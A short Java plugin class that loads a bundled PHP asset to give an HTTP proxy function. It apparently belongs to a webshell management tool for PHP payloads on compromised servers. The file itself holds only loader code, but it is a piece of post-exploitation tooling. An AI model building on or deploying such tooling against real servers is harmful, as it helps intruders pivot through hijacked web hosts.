package shells.plugins.php;

import core.annotation.PluginAnnotation;
import java.io.IOException;
import java.io.InputStream;
import shells.plugins.generic.HttpProxy;
import util.functions;

@PluginAnnotation(
   payloadName = "PhpDynamicPayload",
   Name = "HttpProxy",
   DisplayName = "Http代理"
)
public class PHttpProxy extends HttpProxy {
   private static final String CLASS_NAME = "HttpRequest";

   public byte[] readPlugin() throws IOException {
      InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/%s.php", "HttpRequest"));
      byte[] data = functions.readInputStream(inputStream);
      inputStream.close();
      return data;
   }

   public String getClassName() {
      return "HttpRequest";
   }
}
